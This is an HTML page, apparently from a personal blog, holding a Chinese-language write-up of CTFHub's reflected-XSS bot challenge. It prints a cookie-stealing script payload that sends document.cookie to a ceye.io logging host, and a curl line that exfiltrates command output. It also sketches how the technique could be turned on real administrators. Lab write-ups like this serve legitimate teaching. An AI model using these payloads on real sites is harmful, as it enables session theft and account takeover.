@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: 反射型XSS - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.1rem; margin: 1.5rem 0 0.8rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; border-radius: 0 8px 8px 0; margin-bottom: 1rem; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { display: inline-flex; align-items: center; gap: 8px; color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; font-size: 0.95rem; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); transform: translateY(-3px); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctfhub.html"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-code"></i> 反射型XSS - CTFHub Web 入门 Writeup</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月18日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> XSS</span>
+            <span><i class="fas fa-tag"></i> 外带数据</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>1.题目名称：</strong>反射型XSS</li>
+            <li><strong>2.题目平台：</strong>CTFHub</li>
+            <li><strong>3.题目类型：</strong>Web / XSS / 外带数据（OOB）</li>
+            <li><strong>4.靶场链接：</strong>http://challenge-403c9a100ea8ec90.sandbox.ctfhub.com:10800/</li>
+            <li><strong>5.涉及工具：</strong>Ceye.io（HTTP外带平台）、浏览器（地址栏传参）</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>这道题引入了“Bot（机器人管理员）”机制。页面有两个功能：一是“What's your name”，输入内容会被直接回显到页面上，存在反射型XSS漏洞；二是“Send URL to Bot”，它会模拟一个管理员去访问你提供的URL。这道题的核心是：构造一个包含恶意JS代码的URL，诱导Bot访问，并在Bot的浏览器中执行JS代码，从而窃取Bot的Cookie（Flag就藏在Cookie里）。</p>
+
+        <h3>2. 怎么想</h3>
+        <p>因为Bot没有屏幕，直接输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>弹窗你是看不见的。所以需要利用“外带数据（Out-of-Band）”技术，让Bot执行JS代码后，主动向一个我们能查看到的外部服务器发起请求，并把Cookie作为参数带过去。这需要用到HTTP日志平台（如Ceye.io）。</p>
+
+        <h3>3. 怎么解（极其详细步骤与踩坑记录）</h3>
+        
+        <h4>第一步：获取外带数据平台</h4>
+        <p>访问<code>http://ceye.io/</code>注册账号并登录。在Profile页面找到<code>Identifier</code>，记下专属域名，例如：<code>knxh5j.ceye.io</code>。</p>
+        <p><strong>踩坑记录一：</strong>起初使用DNSLog.cn平台，但DNSLog只能记录域名查询，无法获取HTTP请求的参数（?c=ctfhub{...}），导致无法拿到Flag。<strong>改进：</strong>更换为支持HTTP日志的Ceye.io平台。</p>
+        
+        <h4>第二步：构造恶意 Payload</h4>
+        <p>在“What's your name”输入框内输入以下Payload：</p>
+        <pre><code>&lt;script&gt;new Image().src='http://knxh5j.ceye.io/?c='+document.cookie&lt;/script&gt;</code></pre>
+        <p><strong>代码逐字翻译与符号解释：</strong></p>
+        <ul>
+            <li><code>&lt;script&gt;</code>：HTML标签，告诉浏览器中间的内容是JavaScript代码，需要执行。</li>
+            <li><code>new Image()</code>：创建一个内存中的图片对象。<code>new</code>是实例化关键字，<code>Image</code>是图片类。</li>
+            <li><code>.src</code>：图片对象的属性，用于设置图片的URL地址。</li>
+            <li><code>=</code>：赋值符号，将等号右边的值赋给左边。</li>
+            <li><code>'http://knxh5j.ceye.io/?c='</code>：目标URL字符串。<code>http://</code>是协议，<code>knxh5j.ceye.io</code>是Ceye.io域名，<code>?c=</code>是参数名为c。</li>
+            <li><code>+</code>：字符串拼接符，用于连接前面的URL和后面的Cookie值。</li>
+            <li><code>document</code>：浏览器提供的文档对象。</li>
+            <li><code>.cookie</code>：文档对象的属性，包含当前网页的所有Cookie。</li>
+            <li><code>&lt;/script&gt;</code>：脚本结束标签。</li>
+        </ul>
+        <p>点击输入框右侧的 <strong>Submit</strong> 按钮。此时浏览器地址栏会变成包含该Payload的长URL。</p>
+
+        <h4>第三步：将URL发送给机器人</h4>
+        <p>复制浏览器地址栏里的长URL，粘贴到下方“Send URL to Bot”输入框里，点击右侧的 <strong>Send</strong> 按钮。</p>
+        <p><strong>踩坑记录二：</strong>我最初把Payload（&lt;script&gt;...）直接粘贴进了“Send URL to Bot”框，页面报错 <code>Not Match</code>。<strong>原因分析：</strong>该输入框校验非常严格，只接受以 <code>http(s)://challenge-xxxx.sandbox.ctfhub.com:10800</code> 开头的完整URL。<strong>改进：</strong>必须先在“What's your name”提交Payload，让浏览器生成完整的URL，再把这串URL发给Bot。</p>
+
+        <h4>第四步：在Ceye.io中收网拿Flag</h4>
+        <p>回到Ceye.io，点击左侧<code>Records</code> -> <code>HTTP Request</code>，刷新列表，找到Bot发来的请求记录。记录中会包含类似 <code>http://knxh5j.ceye.io/?c=ctfhub{...}</code> 的内容。</p>
+        <p>提取出 <code>ctfhub{...}</code> 去提交。</p>
+        <p><strong>最终 Flag：</strong> <code>ctfhub{d21772a8e2b74d834639cad2}</code></p>
+
+        <div class="note-box">
+            <p><strong>踩坑记录三：</strong>操作过程中环境多次过期（CTFHub环境寿命仅30分钟），导致机器人无法访问链接，Ceye.io里一直刷不出记录。<strong>改进：</strong>遇到此情况立即去网页端点击“停止并销毁环境”并重新“开启题目”，拿到新地址后重新快速执行全套流程。</p>
+        </div>
+
+        <h3>4. 怎么迁移</h3>
+        <ul>
+            <li><strong>其他XSS场景：</strong>在存储型XSS中，也可以使用此方法打管理员。将Payload存在评论区，等管理员审核时触发，自动外带其Cookie。</li>
+            <li><strong>SSRF漏洞利用：</strong>在SSRF（服务端请求伪造）中，同样可以使用Ceye.io或DNSLog来验证漏洞是否存在（无回显的情况）。</li>
+            <li><strong>命令注入/RCE：</strong>在无回显的命令执行漏洞中，可以使用 <code>curl http://ceye.io/?c=$(whoami)</code> 等方式外带命令执行的结果。</li>
+            <li><strong>代码审计迁移：</strong>看到 <code>document.write</code> 或 <code>innerHTML</code> 直接处理用户输入，立即判定可能存在DOM型或反射型XSS。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        <div class="highlight-box">
+            <p><strong>1. 反射型XSS：</strong>恶意代码作为参数发送给服务器，服务器将其原封不动地“反射”回浏览器，浏览器执行代码。是一次性的攻击。</p>
+            <p><strong>2. Bot（机器人）：</strong>在CTF中，指代一个无头浏览器（Headless Browser），它没有图形界面，但会执行网页上的JavaScript代码。用来模拟真实环境下的管理员访问。</p>
+            <p><strong>3. 外带数据（Out-of-Band, OOB）：</strong>当目标系统无法直接返回结果（如无回显）时，通过让目标发起DNS或HTTP请求，将数据带到外部可控平台的手法。</p>
+            <p><strong>4. Cookie：</strong>服务器保存在浏览器中的一小段数据，用于辨别用户身份。在本例中，Flag就藏在Bot的Cookie里。</p>
+            <p><strong>5. 原理深度复盘：</strong>XSS的本质是“用户数据被当作代码执行”。这道题演示了XSS的真实危害——不仅弹窗，而是利用JS读取用户私密信息（Cookie）并外发。整个攻击链是：反射型XSS（注入点） -> 机器人（受害者） -> JS代码执行（读取Cookie） -> 外带数据（发送给攻击者）。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        <div class="highlight-box">
+            <p><strong>1. 跟前面的区别：</strong>与之前自己弹窗自己看的XSS题相比，这道题引入了“Bot”和“外带数据”的概念。输入点依然是反射型XSS，但利用方式从“自我验证”升级为“攻击管理员”。</p>
+            <p><strong>2. 这种题目的出现原因：</strong>单纯弹窗的XSS危害有限，真实的XSS攻击目标是为了窃取用户凭证、会话劫持或钓鱼。CTFHub引入Bot和外带数据机制，是为了模拟真实环境中“无回显”的XSS利用场景，考察选手的综合实战能力。</p>
+            <p><strong>3. 这种漏洞的应用：</strong>在实战中，攻击者可以将恶意链接发送给论坛管理员、客服或特定目标用户。一旦对方点击，其Cookie就会被发送到攻击者服务器，导致账号被接管（如XSS蠕虫、后台越权）。</p>
+            <p><strong>4. 如何抽象理解概念：</strong>把XSS攻击想象成“在别人的信封里放入一封内鬼信”。信封是网页，内鬼信是JS代码。信的内容是：“见字如面，请把您的身份证明（Cookie）寄到这个地址（外带平台）。”只要用户打开了这封信，内鬼就会执行任务。</p>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p >
+
+        <div class="action-bar">
+            <a href="/ctfhub.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
